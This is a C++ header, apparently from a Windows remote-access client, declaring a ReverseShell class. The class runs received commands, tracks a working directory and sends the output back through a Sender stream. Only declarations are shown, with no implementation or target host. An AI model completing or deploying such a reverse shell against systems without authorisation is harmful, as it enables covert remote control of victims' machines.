#ifndef CLIENT_REVERSESHELL_H
#define CLIENT_REVERSESHELL_H
#include <fcntl.h>
#include <string>
#include <array>
#include <memory>
#include <iostream>
#include <cstring>
#include "Sender.h"
#include "json.hpp"
#include <windows.h>



class ReverseShell : public Sender{
private:
    std::string currentDirectory=".";
public:
    void executeCommandAndSendResult(nlohmann::json jsonObject);
    explicit ReverseShell(const Stream &stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap);
    std::string executeCommand(const std::wstring&);
    static int runCmd(const std::string &commandToExecute, std::string& outOutput);
    void send() override;
};


#endif
